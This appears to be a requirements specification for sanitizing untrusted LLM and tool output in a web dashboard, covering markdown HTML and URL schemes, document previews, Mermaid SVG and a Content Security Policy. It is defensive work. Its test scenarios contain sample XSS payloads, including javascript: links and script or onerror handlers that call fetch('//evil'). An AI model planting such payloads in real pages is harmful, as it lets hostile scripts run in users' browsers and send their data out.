## ADDED Requirements

### Requirement: Markdown renderer sanitizes untrusted HTML and URL schemes
The markdown renderer SHALL sanitize embedded raw HTML and SHALL restrict link
and resource URL schemes when rendering untrusted content (LLM/tool output). Raw
HTML parsed by `rehypeRaw` SHALL pass through a sanitizer (`rehype-sanitize` or
equivalent) that removes script-bearing elements and dangerous attributes before
React renders it. URL values SHALL be transformed by an allowlist permitting only
`http`, `https`, `mailto`, `pi-asset`, and `data:image/*`; `javascript:` and
`data:text/html` SHALL be dropped. The sanitizer schema SHALL preserve KaTeX
output and image sources the app legitimately uses.

#### Scenario: javascript: link neutralized
- **WHEN** markdown source contains `[x](javascript:alert(document.domain))`
- **THEN** the rendered anchor SHALL NOT carry a `javascript:` href (dropped or inert)

#### Scenario: iframe srcdoc script neutralized
- **WHEN** markdown source contains `<iframe srcdoc="<script>fetch('//evil')</script>">`
- **THEN** the sanitized output SHALL NOT execute the embedded script in the dashboard origin

#### Scenario: legitimate content preserved
- **WHEN** markdown source contains a KaTeX math block, a GFM table, and an image with a `pi-asset:` source
- **THEN** all three SHALL render normally after sanitization

### Requirement: Document preview HTML is sanitized before injection
Document preview HTML derived from untrusted files SHALL be sanitized with
DOMPurify before it is injected via `dangerouslySetInnerHTML`. The AsciiDoc
preview SHALL sanitize asciidoctor output on the server (parity with the DOCX
path) so inline HTML passthrough (`+++…+++`, `pass:[…]`) cannot introduce active
content. `safe:"secure"` alone SHALL NOT be treated as HTML sanitization.

#### Scenario: AsciiDoc passthrough stripped
- **WHEN** an `.adoc` file contains `+++<img src=x onerror=fetch('//evil')>+++`
- **THEN** the returned preview HTML SHALL NOT contain the `onerror` handler or an active script vector

#### Scenario: AsciiDoc legitimate formatting preserved
- **WHEN** an `.adoc` file contains headings, lists, and a table
- **THEN** the sanitized preview SHALL render those elements normally

### Requirement: Mermaid SVG sanitized with a parser
The mermaid renderer SHALL sanitize rendered SVG with a DOM-aware sanitizer
(DOMPurify with SVG profiles) rather than a regular expression before injecting
it. The sanitizer SHALL drop `javascript:` URIs (including `xlink:href`) and event
handler attributes while preserving `<foreignObject>` label content.

#### Scenario: SVG xlink:href javascript dropped
- **WHEN** a mermaid diagram renders an `<a xlink:href="javascript:alert(1)">`
- **THEN** the injected SVG SHALL NOT retain the `javascript:` reference

#### Scenario: foreignObject labels preserved
- **WHEN** a mermaid diagram uses HTML labels rendered in `<foreignObject>`
- **THEN** the sanitized SVG SHALL still display the label text

### Requirement: Content Security Policy restricts script sources
The server SHALL send a Content-Security-Policy response header for the dashboard
document that restricts script execution to first-party sources (`script-src
'self'`, without `unsafe-inline` for scripts). The policy SHALL be compatible with
the app's legitimate assets (styles, images, WebSocket connections).

#### Scenario: inline script blocked by CSP
- **WHEN** a response document is loaded and an injected inline `<script>` would run
- **THEN** the CSP SHALL block its execution

#### Scenario: app assets still load under CSP
- **WHEN** the dashboard loads its bundled scripts, styles, images, and opens its WebSocket
- **THEN** none SHALL be blocked by the CSP
